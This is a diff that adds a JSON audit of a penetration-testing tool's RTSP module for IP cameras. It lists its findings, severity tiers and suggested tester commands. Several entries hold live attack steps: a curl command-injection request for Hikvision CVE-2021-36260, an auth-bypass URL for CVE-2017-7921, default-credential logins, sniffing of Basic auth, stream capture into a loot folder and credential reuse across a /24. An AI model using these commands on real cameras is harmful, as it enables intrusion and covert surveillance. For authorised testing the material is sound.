@@ -1,0 +1,159 @@
+{
+  "service": "rtsp",
+  "summary": "RTSP module is one of the strongest in this tranche \u2014 OPTIONS/DESCRIBE fingerprint + SDP disclosure + well-known vendor path enum + rtsp_unauth_stream (T2 world-viewable) + default_cred_check (T3 12 vendor defaults with Digest auth). The RTSP-over-HTTP tunnel probe is defined but its finding kind (rtsp_http_tunnel) has a NARRATIVE entry but no findings() emitter \u2014 dead code. rtsp_creds_in_url pulls text-derived creds but never validates them against the target. digest_capture leaves a hashcat placeholder that no downstream module consumes.",
+  "module_files": [
+    "/home/kali/Desktop/projects/recce/recce/services/rtsp.py"
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_users",
+    "known_passwords",
+    "known_devices",
+    "known_streams (already consumed)",
+    "cve_map (KEV consumer)"
+  ],
+  "findings": [
+    {
+      "kind": "rtsp_fingerprint",
+      "title_pattern": "RTSP server discloses vendor/model via OPTIONS",
+      "severity": "medium",
+      "tier": "t0",
+      "tier_evidence": "Server header + Public verb list are pure fingerprint.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Cross-reference Server against CVE table (already done via cve_hits) \u2014 the actual promotion is rtsp_known_vuln, so this stays fingerprint.",
+      "promotion_risk": "none",
+      "tester_next_step": "openRTSP -O rtsp://<ip>:<port>/",
+      "related_cves": []
+    },
+    {
+      "kind": "rtsp_liveness",
+      "title_pattern": "RTSP GET_PARAMETER keepalive answered",
+      "severity": "low",
+      "tier": "t0",
+      "tier_evidence": "Confirms a live RTSP responder; no vuln.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Covered by other findings for depth.",
+      "promotion_risk": "none",
+      "tester_next_step": "openRTSP -O rtsp://<ip>:<port>/",
+      "related_cves": []
+    },
+    {
+      "kind": "rtsp_auth_disclosure",
+      "title_pattern": "RTSP Digest realm / Basic scheme discloses camera identity",
+      "severity": "medium",
+      "tier": "t0",
+      "tier_evidence": "Realm string is a fingerprint; Basic-alongside-Digest is a config observation.",
+      "can_promote_to": "t2",
+      "promotion_notes": "When Basic offered, wire tcpdump helper (already recommended in cmd) to catch a live client Authorization: Basic <b64> = T2 credential capture. Currently just advises.",
+      "promotion_risk": "medium",
+      "tester_next_step": "tcpdump -i <iface> -A 'tcp port 554' | grep -i 'Authorization: Basic'",
+      "related_cves": []
+    },
+    {
+      "kind": "rtsp_digest_capture",
+      "title_pattern": "RTSP Digest challenge captured (hashcat-11400 shape)",
+      "severity": "medium",
+      "tier": "t0",
+      "tier_evidence": "The captured challenge is server-side only; the emitted $sip$ shape has literal '<nc>*<cnonce>*...*<response>' placeholders \u2014 not crackable without a client capture.",
+      "can_promote_to": "t2",
+      "promotion_notes": "During default_cred_check recce already computes a real client response \u2014 capture THAT into a hashcat-shape line for offline crack, not just the server portion. Also promote to sniff+MitM helper.",
+      "promotion_risk": "low",
+      "tester_next_step": "Wait for a live client capture; feed captured (realm,nonce,nc,cnonce,uri,method,response) into hashcat -m 11400 wordlist.",
+      "related_cves": []
+    },
+    {
+      "kind": "rtsp_unauth_stream",
+      "title_pattern": "RTSP stream world-viewable (no authentication)",
+      "severity": "critical",
+      "tier": "t2",
+      "tier_evidence": "DESCRIBE returned 200 + SDP with codecs/media/tool parsed \u2014 the module has proven the stream serves without auth. Attacker only needs ffplay to consume.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Trigger a bounded ffmpeg 5-second grab as evidence artifact (jpg snapshot). Save to loot/. Also apply to co-located ONVIF (554\u2192onvif on 80/8080) \u2014 same cameras usually leave ONVIF anonymous.",
+      "promotion_risk": "low",
+      "tester_next_step": "ffmpeg -rtsp_transport tcp -i rtsp://<ip>:<port>/ -t 5 -c copy loot/rtsp_<ip>.mkv; ffmpeg -i loot/rtsp_<ip>.mkv -vframes 1 loot/rtsp_<ip>.jpg.",
+      "related_cves": []
+    },
+    {
+      "kind": "rtsp_sdp_disclosure",
+      "title_pattern": "RTSP DESCRIBE discloses SDP",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "SDP body actually returned to unauth DESCRIBE (401 or 200 elsewhere) \u2014 real disclosure of tracks/codecs.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Extract control URIs from a=control and issue SETUP+PLAY to prove that one track actually streams RTP anonymously.",
+      "promotion_risk": "low",
+      "tester_next_step": "ffprobe -rtsp_transport tcp rtsp://<ip>:<port>/; then ffplay -rtsp_transport tcp rtsp://<ip>:<port>/<control-uri-from-sdp>.",
+      "related_cves": []
+    },
+    {
+      "kind": "rtsp_path_enum",
+      "title_pattern": "RTSP well-known vendor paths responded",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "Real 200/401 responses to per-vendor paths \u2014 deterministic vendor fingerprint + stream URL disclosure.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Any 200 hit already promotes via unauth_stream. Any 401 hit should feed default_cred_check with THAT path (currently only root '/' is tested), materially raising the T3 hit rate.",
+      "promotion_risk": "low",
+      "tester_next_step": "For each 401-answering path try camera defaults: openRTSP -u admin -p 12345 rtsp://<ip>:<port><path>",
+      "related_cves": []
+    },
+    {
+      "kind": "rtsp_known_vuln",
+      "title_pattern": "IP camera fingerprint matches known-vulnerable build (CVE-XXXX-XXXX)",
+      "severity": "critical",
+      "tier": "t0",
+      "tier_evidence": "Server-header regex match only; no version check, no PoC executed. The CVE label rides on a substring like 'Hikvision' without firmware version confirmation.",
+      "can_promote_to": "t2",
+      "promotion_notes": "For CVE-2021-36260 (Hikvision) send the PoC PUT /SDK/webLanguage with the ${IFS} command injection payload as `id > /tmp/x` and read back \u2014 deterministic T2 RCE proof (still gated as active/opt-in). For CVE-2017-7921 issue GET /Security/users?auth=YWRtaW46MTEK to confirm auth bypass.",
+      "promotion_risk": "high",
+      "tester_next_step": "curl -k -X PUT 'http://<ip>/SDK/webLanguage' -d '<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(id)</language>' \u2014 confirms CVE-2021-36260; curl 'http://<ip>/Security/users?auth=YWRtaW46MTEK' \u2014 confirms CVE-2017-7921.",
+      "related_cves": [
+        "CVE-2021-36260",
+        "CVE-2017-7921",
+        "CVE-2021-33044",
+        "CVE-2021-33045",
+        "CVE-2013-6117",
+        "CVE-2018-10660",
+        "CVE-2018-10661",
+        "CVE-2018-10662",
+        "CVE-2018-6832",
+        "CVE-2019-15232"
+      ]
+    },
+    {
+      "kind": "rtsps_probe",
+      "title_pattern": "RTSP-over-TLS (RTSPS) endpoint reachable",
+      "severity": "low",
+      "tier": "t0",
+      "tier_evidence": "Handshake + cert CN fingerprint only.",
+      "can_promote_to": "stay",
+      "promotion_notes": "CN often IS the MAC/serial \u2014 feed into known_devices as high-signal identifier.",
+      "promotion_risk": "none",
+      "tester_next_step": "openssl s_client -connect <ip>:322 </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer",
+      "related_cves": []
+    },
+    {
+      "kind": "rtsp_default_cred",
+      "title_pattern": "RTSP default credentials accepted",
+      "severity": "critical",
+      "tier": "t3",
+      "tier_evidence": "DESCRIBE authenticated (200 OK) with a specific user/pass \u2014 actual credentialed session established.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Push the cred into known_credentials so the co-located HTTP admin UI, ONVIF (80/8080/onvif), Telnet (23), and vendor UDP config (37777 Dahua, 9010 Hikvision-SDK) auto-retry it. Chain into cred_quickconnect for one-click ffmpeg dump.",
+      "promotion_risk": "low",
+      "tester_next_step": "openRTSP -u <user> -p <pass> rtsp://<ip>:<port>/; curl -u <user>:<pass> http://<ip>/ISAPI/System/deviceInfo (Hikvision) or http://<ip>/cgi-bin/magicBox.cgi?action=getSystemInfo (Dahua) to test admin-UI reuse; feed into ONVIF probe.",
+      "related_cves": []
+    },
+    {
+      "kind": "rtsp_creds_in_url",
+      "title_pattern": "RTSP credentials in URL / config",
+      "severity": "medium",
+      "tier": "t3",
+      "tier_evidence": "Cleartext user/pass extracted from previously-collected text; not validated but reusable.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Push text-derived creds into default_cred_check pairs for the target host + into known_credentials for global reuse. Validate the pair with a DESCRIBE first, then flag as T3.",
+      "promotion_risk": "low",
+      "tester_next_step": "openRTSP -u <user> -p <pass> rtsp://<host>:<port><path>; then retry same pair against every camera on the /24.",
+      "related_cves": []
+    }
+  ]
+}
